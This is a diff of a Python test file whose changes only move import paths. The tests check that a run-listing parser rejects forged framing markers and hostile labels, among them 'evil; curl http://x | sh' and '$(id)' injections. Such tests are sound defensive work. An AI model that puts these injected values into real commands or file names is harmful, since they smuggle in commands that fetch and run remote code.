@@ -20,15 +20,15 @@ import time
 import unittest
 from pathlib import Path
 
-from merv.brain.sandbox.execution.backends.modal.sandbox_backend import (
+from merv.brain.sandbox.adapters.modal import (
     MODAL_APT_PACKAGES,
     REC_SCRIPT as MODAL_REC_SCRIPT,
 )
-from merv.brain.sandbox.execution.backends.lambda_labs.sandbox_backend import (
+from merv.brain.sandbox.adapters.lambda_labs import (
     LAMBDA_APT_PACKAGES,
 )
-from merv.brain.sandbox.execution.vm_bootstrap import REC_SCRIPT as LAMBDA_REC_SCRIPT
-from merv.brain.sandbox.execution.bootstrap_tools import (
+from merv.brain.sandbox.remote.vm_bootstrap import REC_SCRIPT as LAMBDA_REC_SCRIPT
+from merv.brain.sandbox.remote.bootstrap_tools import (
     BASELINE_APT_PACKAGES,
     REC_EXEC_CORE,
 )
@@ -236,7 +236,7 @@ class ListingFramingTest(unittest.TestCase):
         )
 
     def test_newline_in_directory_name_cannot_forge_a_block(self) -> None:
-        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+        from merv.brain.sandbox.remote.run_receipts import parse_runs_listing
 
         # An ACTUAL newline — legal in a Linux directory name.
         hostile = 'evil\n===MERV_RUN seed0\n===EXIT 0\n'
@@ -250,7 +250,7 @@ class ListingFramingTest(unittest.TestCase):
         self.assertIsNone(parsed[0]["exit_code"])
 
     def test_marker_inside_meta_json_cannot_forge_a_block(self) -> None:
-        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+        from merv.brain.sandbox.remote.run_receipts import parse_runs_listing
 
         stream = (
             self._emit("seed0", meta='{"command":"REAL"}')
@@ -261,7 +261,7 @@ class ListingFramingTest(unittest.TestCase):
         self.assertIsNone(parsed[0]["exit_code"])
 
     def test_marker_inside_exit_code_file_cannot_forge_a_block(self) -> None:
-        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+        from merv.brain.sandbox.remote.run_receipts import parse_runs_listing
 
         stream = (
             self._emit("seed0", meta='{"command":"REAL"}')
@@ -272,14 +272,14 @@ class ListingFramingTest(unittest.TestCase):
         self.assertIsNone(parsed[0]["exit_code"])
 
     def test_shell_metacharacter_labels_are_dropped(self) -> None:
-        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+        from merv.brain.sandbox.remote.run_receipts import parse_runs_listing
 
         for hostile in ("evil; curl http://x | sh", "a`id`", "a$(id)", "a b", " seed0 "):
             with self.subTest(label=hostile):
                 self.assertEqual(parse_runs_listing(self._emit(hostile)), [])
 
     def test_legitimate_labels_round_trip(self) -> None:
-        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+        from merv.brain.sandbox.remote.run_receipts import parse_runs_listing
 
         for good in ("seed0", "qpf_rest", "tier-1.2", "A_b-c.9"):
             with self.subTest(label=good):
@@ -293,7 +293,7 @@ class ListingFramingTest(unittest.TestCase):
                 self.assertEqual(parsed[0]["pid"], 7)
 
     def test_the_emitted_shell_command_base64s_every_field(self) -> None:
-        from merv.brain.sandbox.execution.run_receipts import runs_listing_command
+        from merv.brain.sandbox.remote.run_receipts import runs_listing_command
 
         cmd = runs_listing_command(experiment_dir="/workspace/exp")
         for field in ("meta.json", "exit_code", "finished_at"):
@@ -318,7 +318,7 @@ class ListingFramingTest(unittest.TestCase):
         import subprocess
         import tempfile
 
-        from merv.brain.sandbox.execution.run_receipts import (
+        from merv.brain.sandbox.remote.run_receipts import (
             parse_runs_listing,
             runs_listing_command,
         )
@@ -348,7 +348,7 @@ class ListingFramingTest(unittest.TestCase):
         import subprocess
         import tempfile
 
-        from merv.brain.sandbox.execution.run_receipts import (
+        from merv.brain.sandbox.remote.run_receipts import (
             parse_runs_listing,
             runs_listing_command,
         )
@@ -386,7 +386,7 @@ class ListingFramingTest(unittest.TestCase):
         """
         import base64
 
-        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+        from merv.brain.sandbox.remote.run_receipts import parse_runs_listing
 
         split = b'{"label":"seed0","command":"caf\xc3","pid":7,"started_at":"t"}'
         stream = (
